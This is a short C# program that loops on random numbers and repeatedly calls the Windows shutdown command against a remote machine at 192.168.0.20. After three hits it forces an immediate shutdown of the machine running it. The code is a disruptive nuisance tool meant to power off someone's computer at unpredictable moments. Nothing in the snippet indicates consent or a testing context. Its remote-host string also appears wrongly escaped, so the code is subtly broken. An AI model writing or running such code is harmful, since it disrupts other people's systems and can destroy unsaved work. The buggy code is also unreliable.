int countDown = 0;
string cmdText = "/K shutdown /s /t 0 /m \\192.168.0.20";
while (true)
{
    Random random = new Random();
    int randomNumber =  random.Next(1, 1000);
    if (randomNumber == 500)
    {
        countDown++;
        ShutDown();
        
    }
    if (countDown == 3)
    {
        cmdText = "/K shutdown /s /t 0 /m";
        ShutDown();
        return;
    }
}

void ShutDown() => System.Diagnostics.Process.Start("CMD.exe",cmdText);
